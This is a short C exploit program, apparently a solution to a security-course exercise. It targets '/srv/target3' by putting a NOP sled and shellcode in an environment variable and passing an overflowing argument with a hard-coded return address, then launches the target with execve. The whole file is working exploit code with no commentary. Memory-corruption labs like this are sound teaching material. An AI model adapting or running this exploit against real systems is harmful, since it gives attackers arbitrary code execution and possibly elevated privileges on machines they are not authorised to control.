#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target3"
#define ENV_SIZE 400
#define NOP_SIZE 201
#define BASE_ADDR 0xffffdec0
#define RET_OFFSET 4

void craftEnv(char *e) {
    memset(e, 0x90, ENV_SIZE - 1);
    *((uint32_t *)(e)) = BASE_ADDR + RET_OFFSET;
    *((uint32_t *)(e + RET_OFFSET)) = BASE_ADDR + 2 * RET_OFFSET;
    memcpy(e + NOP_SIZE, shellcode, sizeof(shellcode));
    e[ENV_SIZE - 1] = '\0';
}

int main(void) {
    char *argv[3];
    char *envp[2];
    char env[ENV_SIZE];
    char pad[20] = {0};

    craftEnv(env);

    for (int i = 0; i < 16; i++) {
        pad[i] = 0x90;
    }
    *((uint32_t *)(pad + 16)) = BASE_ADDR;

    argv[0] = TARGET;
    argv[1] = pad;
    argv[2] = NULL;

    envp[0] = env;
    envp[1] = NULL;

    execve(TARGET, argv, envp);
    fprintf(stderr, "execve failed.\n");

    return 0;
}